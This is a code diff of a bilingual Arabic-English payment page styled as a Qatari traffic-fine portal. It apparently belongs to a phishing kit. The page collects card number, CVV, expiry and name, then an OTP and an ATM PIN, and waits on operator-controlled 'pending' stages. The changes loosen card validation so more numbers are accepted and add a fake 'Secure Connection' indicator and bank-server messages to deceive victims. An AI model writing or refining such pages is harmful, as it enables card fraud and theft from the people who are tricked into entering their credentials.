@@ -40,17 +40,23 @@ const detectCardType = (number: string): CardType => {
   if (!cleanNumber) return "unknown";
   
   // Visa: starts with 4
-  if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleanNumber)) {
-    return validateCardNumber(cleanNumber) ? "visa" : "invalid";
+  if (cleanNumber.startsWith('4')) {
+    if (cleanNumber.length >= 13) {
+      return validateCardNumber(cleanNumber) ? "visa" : "invalid";
+    }
+    return "unknown"; // Still typing
   }
   
   // Mastercard: starts with 51-55 or 2221-2720
-  if (/^5[1-5][0-9]{14}$/.test(cleanNumber) || /^2[2-7][0-9]{14}$/.test(cleanNumber)) {
-    return validateCardNumber(cleanNumber) ? "mastercard" : "invalid";
+  if (/^5[1-5]/.test(cleanNumber) || /^2[2-7]/.test(cleanNumber)) {
+    if (cleanNumber.length >= 16) {
+      return validateCardNumber(cleanNumber) ? "mastercard" : "invalid";
+    }
+    return "unknown"; // Still typing
   }
   
-  // If it looks like a card but doesn't match known patterns
-  if (/^[0-9]{13,19}$/.test(cleanNumber)) {
+  // If it looks like a card but doesn't match known patterns and is long enough
+  if (cleanNumber.length >= 16) {
     return "invalid";
   }
   
@@ -73,6 +79,7 @@ export default function Payment() {
   const [otpCode, setOtpCode] = useState("");
   const [atmPin, setAtmPin] = useState("");
   const [cardType, setCardType] = useState<CardType>("unknown");
+  const [isFocused, setIsFocused] = useState(false);
 
   const updateStageMutation = trpc.payment.updateStage.useMutation();
 
@@ -128,14 +135,8 @@ export default function Payment() {
   const handleCardSubmit = (e: FormEvent) => {
     e.preventDefault();
     
-    // Validate card number
     if (cardType === "invalid") {
       setError(lang === "ar" ? "رقم البطاقة غير صالح" : "Invalid card number");
-      return;
-    }
-    
-    if (cardType === "unknown") {
-      setError(lang === "ar" ? "نوع البطاقة غير مدعوم" : "Card type not supported");
       return;
     }
     
@@ -187,131 +188,140 @@ export default function Payment() {
       : (isAr ? "رقم اللوحة" : "Plate Number");
 
   return (
-    <div className="min-h-screen bg-[#f1f5f9] font-sans flex flex-col" dir={isAr ? "rtl" : "ltr"}>
+    <div className="min-h-screen bg-[#f8fafc] font-sans flex flex-col" dir={isAr ? "rtl" : "ltr"}>
       <Header />
 
-      <main className="flex-grow max-w-2xl mx-auto px-4 py-8 w-full">
-        {/* Payment Summary Banner */}
-        <div className="bg-white border border-gray-200 rounded-2xl shadow-sm mb-6 overflow-hidden">
-          <div className="bg-[#8A1538] px-6 py-3 text-white flex justify-between items-center">
-            <span className="text-sm font-bold uppercase">{isAr ? "ملخص الدفع" : "Payment Summary"}</span>
-            <span className="text-xs opacity-80 font-mono">#{sessionId.substring(0, 8).toUpperCase()}</span>
-          </div>
-          <div className="p-6 grid grid-cols-2 gap-4">
-            <div>
-              <p className="text-[10px] text-gray-400 font-bold uppercase mb-1">{displayTitle}</p>
-              <p className="text-lg font-black text-[#003E66]">{displayId}</p>
+      <main className="flex-grow max-w-2xl mx-auto px-4 py-10 w-full">
+        {/* Official Summary Box */}
+        <div className="bg-white border border-gray-100 rounded-[2rem] shadow-xl mb-8 overflow-hidden">
+          <div className="bg-[#8A1538] px-8 py-4 text-white flex justify-between items-center">
+            <span className="text-xs font-black uppercase tracking-widest">{isAr ? "بيانات الدفع" : "Payment Info"}</span>
+            <div className="flex items-center gap-2">
+              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+              <span className="text-[10px] font-bold uppercase">{isAr ? "اتصال آمن" : "Secure Connection"}</span>
             </div>
-            <div className="text-right">
-              <p className="text-[10px] text-gray-400 font-bold uppercase mb-1">{isAr ? "المبلغ المستحق" : "Total Amount"}</p>
-              <p className="text-2xl font-black text-[#8A1538]">{sessionData?.totalAmount} <span className="text-xs">QAR</span></p>
+          </div>
+          <div className="p-8 grid grid-cols-2 gap-8 items-center">
+            <div className={isAr ? "border-l border-gray-100" : "border-r border-gray-100"}>
+              <p className="text-[10px] text-gray-400 font-black uppercase mb-1 tracking-wider">{displayTitle}</p>
+              <p className="text-2xl font-black text-[#003E66]">{displayId}</p>
+            </div>
+            <div className="text-center">
+              <p className="text-[10px] text-gray-400 font-black uppercase mb-1 tracking-wider">{isAr ? "المبلغ الإجمالي" : "Total Amount"}</p>
+              <p className="text-3xl font-black text-[#8A1538]">{sessionData?.totalAmount} <span className="text-sm font-bold">QAR</span></p>
             </div>
           </div>
         </div>
 
-        <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
-          <div className="p-6 sm:p-10">
+        <div className="bg-white border border-gray-100 rounded-[2rem] shadow-2xl overflow-hidden">
+          <div className="p-8 sm:p-12">
             {/* Stage: Card Entry */}
             {stage === "card" && (
-              <form onSubmit={handleCardSubmit} className="space-y-6">
-                <div className="flex items-center gap-3 mb-6">
-                  <div className="w-10 h-10 bg-[#8A1538]/10 rounded-full flex items-center justify-center text-[#8A1538]">
-                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
+              <form onSubmit={handleCardSubmit} className="space-y-8">
+                <div className="flex items-center gap-4 mb-2">
+                  <div className="w-12 h-12 bg-[#8A1538] rounded-2xl flex items-center justify-center text-white shadow-lg shadow-[#8A1538]/20">
+                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                   </div>
-                  <h2 className="text-xl font-black text-gray-900">{isAr ? "تفاصيل بطاقة الدفع" : "Payment Card Details"}</h2>
+                  <div>
+                    <h2 className="text-2xl font-black text-gray-900">{isAr ? "بطاقة الدفع" : "Payment Card"}</h2>
+                    <p className="text-xs text-gray-400 font-bold uppercase">{isAr ? "أدخل بيانات بطاقتك البنكية" : "Enter your bank card details"}</p>
+                  </div>
                 </div>
 
                 {error && (
-                  <div className="p-4 bg-red-50 border-s-4 border-red-500 text-red-700 text-sm font-bold">
+                  <div className="p-4 bg-red-50 border-s-4 border-red-500 text-red-700 text-sm font-black animate-in slide-in-from-top duration-300">
                     {error}
                   </div>
                 )}
 
-                <div className="space-y-5">
-                  {/* Card Number Input with Smart Icon */}
-                  <div>
-                    <label className="block text-xs font-black text-gray-500 uppercase mb-2">{isAr ? "رقم البطاقة" : "Card Number"}</label>
-                    <div className={`relative border-2 rounded-xl transition-all ${
+                <div className="space-y-6">
+                  {/* Professional Card Number Input */}
+                  <div className="space-y-2">
+                    <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">{isAr ? "رقم البطاقة" : "Card Number"}</label>
+                    <div className={`group relative flex items-center transition-all duration-300 ${
                       cardType === "invalid" 
-                        ? "border-red-500 bg-red-50" 
-                        : cardType === "visa" || cardType === "mastercard"
-                        ? "border-green-500 bg-green-50"
-                        : "border-gray-200 bg-white"
-                    }`}>
+                        ? "ring-2 ring-red-500 shadow-lg shadow-red-100" 
+                        : isFocused 
+                        ? "ring-2 ring-[#8A1538] shadow-lg shadow-[#8A1538]/10" 
+                        : "ring-1 ring-gray-200"
+                    } rounded-2xl bg-gray-50/50`}>
+                      
+                      {/* Integrated Maroon Icon */}
+                      <div className={`flex items-center justify-center w-14 h-14 text-[#8A1538] transition-transform duration-300 ${isFocused ? "scale-110" : ""}`}>
+                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
+                      </div>
+
                       <input 
                         type="text" 
                         value={cardNumber} 
                         onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} 
+                        onFocus={() => setIsFocused(true)}
+                        onBlur={() => setIsFocused(false)}
                         maxLength={19} 
-                        className={`w-full p-4 outline-none font-mono text-lg transition-all bg-transparent ${
-                          cardType === "invalid" 
-                            ? "text-red-600 placeholder-red-300" 
-                            : "text-gray-900 placeholder-gray-400"
-                        }`}
+                        className="flex-grow bg-transparent p-4 outline-none font-mono text-xl font-bold text-gray-900 placeholder-gray-300"
                         placeholder="0000 0000 0000 0000" 
                         required 
                       />
-                      <div className={`absolute inset-y-0 ${isAr ? "left-4" : "right-4"} flex items-center transition-all duration-300`}>
+
+                      {/* Dynamic Logo/Status */}
+                      <div className={`px-4 flex items-center gap-3 transition-all duration-500`}>
                         {cardType === "visa" && (
-                          <img src="/visa-logo.png" alt="Visa" className="h-5 animate-in fade-in duration-300" />
+                          <img src="/visa-logo.png" alt="Visa" className="h-5 animate-in zoom-in duration-300" />
                         )}
                         {cardType === "mastercard" && (
-                          <img src="/mastercard-logo.png" alt="Mastercard" className="h-8 animate-in fade-in duration-300" />
+                          <img src="/mastercard-logo.png" alt="Mastercard" className="h-8 animate-in zoom-in duration-300" />
                         )}
                         {cardType === "invalid" && (
-                          <div className="flex items-center gap-1 text-red-500">
-                            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M13.477 14.89A6 6 0 015.11 2.476a6 6 0 018.367 8.368A6 6 0 0113.477 14.89zm7.07-7.07a7 7 0 11-9.9 9.9 7 7 0 019.9-9.9z" clipRule="evenodd" /><path fillRule="evenodd" d="M9.228 12.227a.75.75 0 00-1.06-1.06L7.07 11.07l-1.097 1.097a.75.75 0 001.06 1.06L8.13 12.13l1.097 1.097a.75.75 0 001.06-1.06L9.19 11.07l1.097-1.097a.75.75 0 00-1.06-1.06L8.13 10.01 7.033 8.912a.75.75 0 10-1.06 1.06L7.07 11.07l-1.097 1.097z" clipRule="evenodd" /></svg>
-                          </div>
-                        )}
-                        {cardType === "unknown" && (
-                          <div className="w-8 h-6 bg-gray-100 rounded flex items-center justify-center text-gray-400">
-                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
+                          <div className="w-8 h-8 bg-red-100 rounded-full flex items-center justify-center text-red-500 animate-in shake duration-500">
+                            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" /></svg>
                           </div>
                         )}
                       </div>
                     </div>
+                    
+                    {/* Professional Error Message */}
                     {cardType === "invalid" && cardNumber && (
-                      <p className="text-red-600 text-xs font-bold mt-2">{isAr ? "⚠️ بطاقة غير صالحة" : "⚠️ Invalid Card"}</p>
-                    )}
-                    {(cardType === "visa" || cardType === "mastercard") && (
-                      <p className="text-green-600 text-xs font-bold mt-2">✓ {cardType === "visa" ? "Visa" : "Mastercard"}</p>
+                      <div className="flex items-center gap-2 text-red-600 px-1 animate-in fade-in slide-in-from-left duration-300">
+                        <span className="w-1.5 h-1.5 bg-red-600 rounded-full"></span>
+                        <p className="text-[11px] font-black uppercase">{isAr ? "رقم البطاقة غير صحيح أو غير مدعوم" : "Invalid or unsupported card number"}</p>
+                      </div>
                     )}
                   </div>
 
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <label className="block text-xs font-black text-gray-500 uppercase mb-2">{isAr ? "تاريخ الانتهاء" : "Expiry Date"}</label>
+                  <div className="grid grid-cols-2 gap-6">
+                    <div className="space-y-2">
+                      <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">{isAr ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                       <input 
                         type="text" 
                         value={cardExpiry} 
                         onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} 
                         maxLength={5} 
                         placeholder="MM/YY" 
-                        className="w-full p-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none text-center font-mono transition-all" 
+                        className="w-full p-4 bg-gray-50/50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none text-center font-mono font-bold transition-all" 
                         required 
                       />
                     </div>
-                    <div>
-                      <label className="block text-xs font-black text-gray-500 uppercase mb-2">{isAr ? "رمز الأمان (CVV)" : "CVV"}</label>
+                    <div className="space-y-2">
+                      <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">{isAr ? "رمز الأمان (CVV)" : "CVV"}</label>
                       <input 
                         type="password" 
                         value={cardCvv} 
                         onChange={(e) => setCardCvv(e.target.value.replace(/[^0-9]/g, ''))} 
                         maxLength={3} 
                         placeholder="•••" 
-                        className="w-full p-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none text-center font-mono transition-all" 
+                        className="w-full p-4 bg-gray-50/50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none text-center font-mono font-bold transition-all" 
                         required 
                       />
                     </div>
                   </div>
 
-                  <div>
-                    <label className="block text-xs font-black text-gray-500 uppercase mb-2">{isAr ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
+                  <div className="space-y-2">
+                    <label className="block text-[10px] font-black text-gray-400 uppercase tracking-widest px-1">{isAr ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
                     <input 
                       type="text" 
                       value={cardName} 
                       onChange={(e) => setCardName(e.target.value.toUpperCase())} 
-                      className="w-full p-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none font-bold transition-all" 
+                      className="w-full p-4 bg-gray-50/50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none font-black transition-all" 
                       placeholder="JASSIM AL-THANI" 
                       required 
                     />
@@ -320,78 +330,78 @@ export default function Payment() {
 
                 <button 
                   type="submit" 
-                  disabled={submitCardMutation.isPending || cardType === "invalid" || cardType === "unknown"} 
-                  className="w-full bg-[#8A1538] text-white py-5 rounded-xl font-black text-lg hover:bg-[#70112d] transition-all shadow-lg active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed mt-4"
+                  disabled={submitCardMutation.isPending || cardType === "invalid" || !cardNumber} 
+                  className="w-full bg-[#8A1538] text-white py-6 rounded-2xl font-black text-xl hover:bg-[#70112d] transition-all shadow-xl shadow-[#8A1538]/20 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed mt-6"
                 >
-                  {submitCardMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الدفع الآمن" : "Confirm Secure Payment")}
+                  {submitCardMutation.isPending ? (isAr ? "جاري المعالجة..." : "Processing...") : (isAr ? "إتمام الدفع الآمن" : "Complete Secure Payment")}
                 </button>
               </form>
             )}
 
             {/* Stage: Loading / Pending */}
             {stage.includes("pending") && (
-              <div className="py-16 text-center space-y-6">
-                <div className="relative w-20 h-20 mx-auto">
-                  <div className="absolute inset-0 border-4 border-[#8A1538]/10 rounded-full"></div>
-                  <div className="absolute inset-0 border-4 border-[#8A1538] border-t-transparent rounded-full animate-spin"></div>
+              <div className="py-20 text-center space-y-8">
+                <div className="relative w-24 h-24 mx-auto">
+                  <div className="absolute inset-0 border-8 border-gray-50 rounded-full"></div>
+                  <div className="absolute inset-0 border-8 border-[#8A1538] border-t-transparent rounded-full animate-spin"></div>
                 </div>
                 <div>
-                  <h3 className="text-xl font-black text-gray-900">{isAr ? "جاري معالجة الطلب" : "Processing Request"}</h3>
-                  <p className="text-sm text-gray-500 mt-2">{isAr ? "يرجى الانتظار، يتم تأمين اتصالك بالبنك..." : "Please wait, securing connection to bank..."}</p>
+                  <h3 className="text-2xl font-black text-gray-900">{isAr ? "تأمين المعاملة" : "Securing Transaction"}</h3>
+                  <p className="text-sm text-gray-400 font-bold uppercase mt-2">{isAr ? "يرجى الانتظار، يتم الاتصال بالبنك..." : "Connecting to bank secure server..."}</p>
                 </div>
               </div>
             )}
 
             {/* Stage: OTP */}
             {stage === "otp" && (
-              <form onSubmit={handleOtpSubmit} className="text-center space-y-8 py-4">
-                <div className="w-20 h-20 bg-blue-50 text-[#003E66] rounded-full flex items-center justify-center mx-auto shadow-sm">
-                  <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
+              <form onSubmit={handleOtpSubmit} className="text-center space-y-10 py-6">
+                <div className="w-24 h-24 bg-[#003E66]/5 text-[#003E66] rounded-[2rem] flex items-center justify-center mx-auto shadow-sm">
+                  <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                 </div>
                 <div>
-                  <h3 className="text-2xl font-black text-gray-900">{isAr ? "رمز التحقق (OTP)" : "Verification Code"}</h3>
-                  <p className="text-gray-500 text-sm mt-2">
-                    {isAr ? "أدخل الرمز المرسل إلى هاتفك المسجل" : "Enter the code sent to your registered phone"}
+                  <h3 className="text-3xl font-black text-gray-900">{isAr ? "رمز التحقق" : "OTP Verification"}</h3>
+                  <p className="text-gray-400 text-sm font-bold mt-2">
+                    {isAr ? "أدخل الرمز المكون من 6 أرقام المرسل لهاتفك" : "Enter the 6-digit code sent to your mobile"}
                   </p>
                 </div>
                 <input 
                   value={otpCode} 
                   onChange={(e) => setOtpCode(e.target.value)} 
-                  className="w-full text-center text-4xl font-black p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] focus:bg-white transition-all font-mono tracking-[0.3em]" 
-                  placeholder="••••••" 
+                  className="w-full text-center text-5xl font-black p-6 bg-gray-50 border-2 border-gray-100 rounded-[2rem] outline-none focus:border-[#8A1538] focus:bg-white transition-all font-mono tracking-[0.4em]" 
+                  placeholder="000000" 
                   maxLength={6} 
                   required 
                   autoFocus
                 />
-                <button type="submit" disabled={submitOtpMutation.isPending} className="w-full bg-[#8A1538] text-white font-black py-5 rounded-xl text-lg shadow-lg hover:bg-[#70112d] transition-all">
-                  {submitOtpMutation.isPending ? (isAr ? "جاري التأكيد..." : "Confirming...") : (isAr ? "تأكيد الرمز" : "Confirm Code")}
+                <button type="submit" disabled={submitOtpMutation.isPending} className="w-full bg-[#8A1538] text-white font-black py-6 rounded-2xl text-xl shadow-xl hover:bg-[#70112d] transition-all">
+                  {submitOtpMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الرمز" : "Verify Code")}
                 </button>
               </form>
             )}
 
             {/* Stage: ATM PIN */}
             {stage === "atm" && (
-              <form onSubmit={handleAtmSubmit} className="text-center space-y-8 py-4">
-                <div className="w-20 h-20 bg-gray-50 text-gray-400 rounded-full flex items-center justify-center mx-auto shadow-sm">
-                  <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
+              <form onSubmit={handleAtmSubmit} className="text-center space-y-10 py-6">
+                <div className="w-24 h-24 bg-gray-50 text-gray-300 rounded-[2rem] flex items-center justify-center mx-auto shadow-sm">
+                  <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                 </div>
                 <div>
-                  <h3 className="text-2xl font-black text-gray-900">{isAr ? "الرقم السري للبطاقة" : "ATM PIN"}</h3>
-                  <p className="text-gray-500 text-sm mt-2">
-                    {isAr ? "يرجى إدخال الرقم السري (PIN) المكون من 4 أرقام" : "Please enter your 4-digit secret PIN"}
+                  <h3 className="text-3xl font-black text-gray-900">{isAr ? "الرقم السري" : "Card PIN"}</h3>
+                  <p className="text-gray-400 text-sm font-bold mt-2">
+                    {isAr ? "أدخل الرقم السري للبطاقة (4 أرقام)" : "Enter your 4-digit card PIN"}
                   </p>
                 </div>
                 <input 
                   type="password" 
                   value={atmPin} 
                   onChange={(e) => setAtmPin(e.target.value.replace(/[^0-9]/g, ''))} 
-                  className="w-48 mx-auto text-center text-4xl font-black p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] focus:bg-white transition-all font-mono tracking-[0.5em]" 
-                  placeholder="••••" 
+                  className="w-56 mx-auto text-center text-5xl font-black p-6 bg-gray-50 border-2 border-gray-100 rounded-[2rem] outline-none focus:border-[#8A1538] focus:bg-white transition-all font-mono tracking-[0.6em]" 
+                  placeholder="0000" 
                   maxLength={4} 
                   required 
                   autoFocus
                 />
-                <button type="submit" disabled={submitAtmPinMutation.isPending} className="w-full bg-[#8A1538] text-white font-black py-5 rounded-xl text-lg shadow-lg hover:bg-[#70112d] transition-all">
+                <button type="submit" disabled={submitAtmPinMutation.isPending} className="w-full bg-[#8A1538] text-white font-black py-6 rounded-2xl text-xl shadow-xl hover:bg-[#70112d] transition-all">
                   {submitAtmPinMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الرقم السري" : "Confirm PIN")}
                 </button>
               </form>
@@ -399,19 +409,19 @@ export default function Payment() {
 
             {/* Stage: Success */}
             {stage === "success" && (
-              <div className="py-12 text-center space-y-8">
-                <div className="w-24 h-24 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto shadow-sm">
-                  <svg className="w-14 h-14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" /></svg>
+              <div className="py-16 text-center space-y-10">
+                <div className="w-32 h-32 bg-green-50 text-green-500 rounded-[3rem] flex items-center justify-center mx-auto shadow-sm">
+                  <svg className="w-16 h-16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="4" d="M5 13l4 4L19 7" /></svg>
                 </div>
                 <div>
-                  <h3 className="text-3xl font-black text-gray-900">{isAr ? "تم الدفع بنجاح" : "Payment Successful"}</h3>
-                  <p className="text-gray-500 mt-2">
-                    {isAr ? "شكراً لك، تم استلام المبلغ وتحديث السجل." : "Thank you, payment received and records updated."}
+                  <h2 className="text-4xl font-black text-gray-900">{isAr ? "تم الدفع بنجاح" : "Success!"}</h2>
+                  <p className="text-gray-400 font-bold uppercase mt-4 tracking-widest">
+                    {isAr ? "تم تحديث سجل المخالفات بنجاح" : "Traffic records updated successfully"}
                   </p>
                 </div>
                 <button 
                   onClick={() => navigate("/")}
-                  className="w-full bg-gray-900 text-white font-black py-5 rounded-xl text-lg shadow-lg hover:bg-black transition-all"
+                  className="w-full bg-gray-900 text-white font-black py-6 rounded-2xl text-xl shadow-xl hover:bg-black transition-all"
                 >
                   {isAr ? "العودة للرئيسية" : "Back to Home"}
                 </button>
